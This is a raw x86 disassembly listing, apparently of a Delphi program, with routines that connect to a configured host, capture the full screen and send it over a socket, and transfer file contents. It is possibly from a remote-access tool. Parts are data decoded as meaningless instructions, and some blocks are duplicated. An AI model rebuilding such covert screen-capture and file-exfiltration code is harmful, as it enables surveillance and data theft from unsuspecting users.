pop ecx
mov [ fs : eax ] edx
push sub_47f9d0
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_47f9dc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47fa1d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x4c ]
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fa24
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_47fa2c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
inc edi
add [ eax + eax ] cl
add al bh
jg r-xdata
add [ ecx - 0xffb3c ] al
call [ eax + 0x48 ]
jne r-xdata
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ edx + edi * 8 + 0x540c0047 ] cl
push ebx
arpl [ edx + 0x65 ] si
outsb
push esp
push 0x8d626d75
inc eax
add [ ebp - 0x75 ] dl
in al dx
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
mov eax [ ebp - 0x4 ]
add esp 0xffffffd0
push ebx
push esi
xor edx edx
mov [ ebp - 0x2030 ] edx
mov [ ebp - 0x2034 ] edx
mov esi eax
xor eax eax
push ebp
push sub_47fd80
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x202c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x202a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov ebx eax
mov [ ebp - 0x2028 ] ebx
inc ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40f944
push 0x10
lea eax [ ebp - 0x202c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x201c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
push 0x2
mov eax [ ebp - 0x4 ]
push eax
call shutdown
mov eax [ ebp - 0x4 ]
push eax
call closesocket
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fd87
lea eax [ ebp - 0x2034 ]
mov edx 0x2
call sub_405554
retn
lea eax [ ebp - 0xc ]
call sub_40f944
lea edx [ ebp - 0x2034 ]
mov eax [ esi + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x2034 ]
lea eax [ ebp - 0x2030 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x2030 ]
mov eax [ ebp - 0x4 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x201c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2028 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_47fd2b
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0x14 ] eax
push 0xa
mov eax [ ebp - 0x10 ]
push eax
call GetDeviceCaps
push eax
push 0x8
mov eax [ ebp - 0x10 ]
push eax
call GetDeviceCaps
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
push 0xa
mov eax [ ebp - 0x10 ]
push eax
call GetDeviceCaps
push eax
push 0x8
mov eax [ ebp - 0x10 ]
push eax
call GetDeviceCaps
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
push eax
call BitBlt
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ esi + 0x48 ]
mov edx [ esi + 0x44 ]
mov eax [ ebp - 0x18 ]
call sub_45ff90
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41b734
mov cl 0x2
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_467718
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call SelectObject
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
mov eax [ ebp - 0x18 ]
push eax
call DeleteObject
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
push 0x0
push ebx
lea eax [ ebp - 0x201c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call send
push 0x0
push 0x2000
lea eax [ ebp - 0x201c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
test ebx ebx
je r-xdata
cmp [ esi + 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x201c ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea edx [ ebp - 0x201c ]
mov ecx 0x2000
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
je r-xdata
sub_47fdb0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh bh
inc edi
add [ eax ] cl
add [ eax ] al
clc
jg r-xdata
inc esp
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ esi + edi * 8 ] dl
inc edi
add [ eax ] dl
push esp
push edx
arpl [ gs : ebp + 0x69 ] sp
jbe r-xdata
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
inc esp
popad
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48005a
lea eax [ ebp - 0x428 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov [ ebp - 0x41c ] 0x2
mov eax [ rw-data ]
inc esi
insb
jne r-xdata
push 0x10
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call connect
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x41a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov edi eax
mov [ ebp - 0x418 ] edi
inc edi
jne r-xdata
call sub_47fe20
retn
lea eax [ eax ]
xor edx edx
mov [ eax + 0x44 ] edx
push 0x2
mov eax [ ebp - 0x8 ]
push eax
call shutdown
mov eax [ ebp - 0x8 ]
push eax
call closesocket
lea edx [ ebp - 0x424 ]
mov eax [ ebx + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x420 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x420 ]
mov eax [ ebp - 0x8 ]
call sub_475ecc
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x418 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
xor eax eax
push ebp
push sub_480012
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push 0x0
push 0x400
lea eax [ esi + 0x1 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call send
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
lea edx [ ebp - 0x428 ]
mov eax [ ebp - 0xc ]
call sub_48cdec
mov eax [ ebp - 0x428 ]
lea ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4616b4
mov eax [ ebp - 0x4 ]
call sub_4760a4
lea eax [ ebp - 0xc ]
call sub_40f944
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x400
call sub_403af4
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
mov ebx eax
test ebx ebx
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_47fe20
push ebp
mov ebp esp
add esp 0xfffffbd8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x428 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
lea esi [ ebp - 0x40c ]
xor eax eax
push ebp
push sub_480053
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48005a
lea eax [ ebp - 0x428 ]
mov edx 0x3
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov [ ebp - 0x41c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x41a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov edi eax
mov [ ebp - 0x418 ] edi
inc edi
jne r-xdata
push 0x10
lea eax [ ebp - 0x41c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call connect
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
push 0x2
mov eax [ ebp - 0x8 ]
push eax
call shutdown
mov eax [ ebp - 0x8 ]
push eax
call closesocket
lea edx [ ebp - 0x424 ]
mov eax [ ebx + 0x40 ]
call sub_409d70
mov ecx [ ebp - 0x424 ]
lea eax [ ebp - 0x420 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x420 ]
mov eax [ ebp - 0x8 ]
call sub_475ecc
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x418 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
xor eax eax
push ebp
push sub_480012
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push 0x0
push 0x400
lea eax [ esi + 0x1 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call send
jmp r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_41b734
lea edx [ ebp - 0x428 ]
mov eax [ ebp - 0xc ]
call sub_48cdec
mov eax [ ebp - 0x428 ]
lea ecx [ ebp - 0x4 ]
mov edx [ rw-data ]
mov edx [ edx ]
call sub_4616b4
mov eax [ ebp - 0x4 ]
call sub_4760a4
lea eax [ ebp - 0xc ]
call sub_40f944
jmp r-xdata
mov eax esi
xor ecx ecx
mov edx 0x400
call sub_403af4
push 0x0
push 0x400
push esi
mov eax [ ebp - 0x8 ]
push eax
call recv
mov ebx eax
test ebx ebx
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_48007c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4800dc
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4059cc
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_4801d3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_48018e
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x168 ]
mov edx 0x3f
mov eax [ ebp - 0x4 ]
call sub_40a488
test eax eax
jne r-xdata
mov [ ebp - 0x170 ] 0xffffffff
mov [ ebp - 0x16c ] 0xffffffff
mov eax [ ebp - 0x12c ]
xor edx edx
mov edx eax
xor eax eax
push edx
push eax
mov eax [ ebp - 0x128 ]
xor edx edx
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x16c ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4801da
lea eax [ ebp - 0x168 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x168 ]
call sub_40a4fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4801fc
push ebp
mov ebp esp
push eax
mov eax 0x2
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffffe7c
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x2184 ] edx
mov [ ebp - 0x2188 ] edx
mov [ ebp - 0x2178 ] edx
mov [ ebp - 0x217c ] edx
mov [ ebp - 0x2180 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_48061c
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480623
lea eax [ ebp - 0x2188 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x0
push 0x1
push 0x2
call socket
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
je r-xdata
mov [ ebp - 0x2174 ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x2172 ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov esi eax
mov [ ebp - 0x2170 ] esi
inc esi
jne r-xdata
push 0x10
lea eax [ ebp - 0x2174 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
test bl bl
je r-xdata
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_480690
push edx
push eax
lea eax [ ebp - 0x217c ]
call sub_409e5c
push [ ebp - 0x217c ]
push r-xdata
lea edx [ ebp - 0x2180 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x44 ]
call sub_409d70
push [ ebp - 0x2180 ]
lea eax [ ebp - 0x2178 ]
mov edx 0x4
call sub_4058e0
mov edx [ ebp - 0x2178 ]
mov eax [ ebp - 0x10 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ eax + 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x2170 ] eax
push 0x2
mov eax [ ebp - 0x10 ]
push eax
call shutdown
mov eax [ ebp - 0x10 ]
push eax
call closesocket
mov eax [ ebp - 0x8 ]
add eax 0x40
call sub_40f944
mov eax [ ebp - 0x8 ]
call sub_41ff18
lea eax [ ebp - 0x2164 ]
call sub_403918
call sub_40305c
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4800dc
cmp edx 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp eax 0x0
ja r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
xor eax eax
push ebp
push sub_480523
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2164 ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x0
mov edx 0x1
lea eax [ ebp - 0x2164 ]
call sub_403e68
mov bl 0x1
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4800dc
push edx
push eax
lea eax [ ebp - 0x2188 ]
call sub_409e5c
push [ ebp - 0x2188 ]
lea eax [ ebp - 0x2184 ]
mov edx 0x4
call sub_4058e0
mov edx [ ebp - 0x2184 ]
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call send
inc eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x2164 ]
call sub_403918
call sub_40305c
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x2018 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x2018 ]
mov ecx 0x2000
lea eax [ ebp - 0x2164 ]
call sub_4038d8
cmp [ ebp - 0xc ] 0x0
jle r-xdata
sub_480528
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
xor ebx ebx
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
jne r-xdata
call sub_404f40
jmp r-xdata
call sub_404f40
jmp r-xdata
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
test bl bl
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0xc ]
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4800dc
push edx
push eax
lea eax [ ebp - 0x2188 ]
call sub_409e5c
push [ ebp - 0x2188 ]
lea eax [ ebp - 0x2184 ]
mov edx 0x4
call sub_4058e0
mov edx [ ebp - 0x2184 ]
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
push 0x2
mov eax [ ebp - 0x10 ]
push eax
call shutdown
mov eax [ ebp - 0x10 ]
push eax
call closesocket
mov eax [ ebp - 0x8 ]
add eax 0x40
call sub_40f944
mov eax [ ebp - 0x8 ]
call sub_41ff18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480623
lea eax [ ebp - 0x2188 ]
mov edx 0x5
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
lea eax [ ebp - 0x2164 ]
call sub_403918
call sub_40305c
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4800dc
cmp edx 0x0
jne r-xdata
jmp r-xdata
jg r-xdata
cmp eax 0x0
ja r-xdata
xor eax eax
push ebp
push sub_480523
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x2164 ]
call sub_403770
mov eax [ rw-data ]
mov [ eax ] 0x0
mov edx 0x1
lea eax [ ebp - 0x2164 ]
call sub_403e68
mov bl 0x1
jmp r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call send
inc eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea eax [ ebp - 0x2164 ]
call sub_403918
call sub_40305c
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
mov edx r-xdata
mov eax [ ebp - 0x10 ]
call sub_475f68
push 0x0
push 0x2000
lea eax [ ebp - 0x2018 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call recv
inc eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x2018 ]
xor ecx ecx
mov edx 0x2000
call sub_403af4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x2018 ]
mov ecx 0x2000
lea eax [ ebp - 0x2164 ]
call sub_4038d8
cmp [ ebp - 0xc ] 0x0
jle r-xdata
sub_480690
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_480743
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48074a
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4800dc
add eax [ ebp - 0x20 ]
adc edx [ ebp - 0x1c ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov eax [ ebx + 0x40 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40a26c
test al al
je r-xdata
sub_480758
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_4807cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov ebx eax
mov [ esi + 0x40 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
jg r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov [ esi + 0x48 ] 0xffffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4807d2
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_4807f0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
or [ eax ] cl
dec esp
add [ eax ] al
add al bh
jg r-xdata
dec eax
add [ eax + 0x78004048 ] bl
sti
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ ebx + edi * 8 ] al
inc ecx
add [ esp + edi * 8 ] ch
inc ecx
add [ eax + ecx + 0x48 ] dl
add [ edx ] dl
push esp
push edx
arpl [ gs : ebp + 0x69 ] sp
jbe r-xdata
add [ edx ] ch
push 0x1
push 0x2
call socket
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0xffffffff
je r-xdata
call sub_480880
retn
inc esi
imul ebp [ ebp + 0x54 ] 0x61657268
nop
xor edx edx
mov [ eax + 0x48 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_480c8d
lea eax [ ebp - 0x218c ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x217c ]
mov edx 0x2
call sub_405d40
lea eax [ ebp - 0x2174 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_405554
retn
mov [ ebp - 0x216c ] 0x2
mov eax [ rw-data ]
movzx eax [ eax ]
push eax
call htons
mov [ ebp - 0x216a ] ax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call inet_addr
mov esi eax
mov [ ebp - 0x2168 ] esi
inc esi
jne r-xdata
push 0x10
lea eax [ ebp - 0x216c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call connect
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call gethostbyname
test eax eax
je r-xdata
test bl bl
je r-xdata
lea edx [ ebp - 0x2174 ]
mov eax [ edi + 0x44 ]
call sub_409d70
mov ecx [ ebp - 0x2174 ]
lea eax [ ebp - 0x2170 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x2170 ]
mov eax [ ebp - 0x4 ]
call sub_475ecc
push 0x0
push 0x2000
lea eax [ ebp - 0x2010 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call recv
inc eax
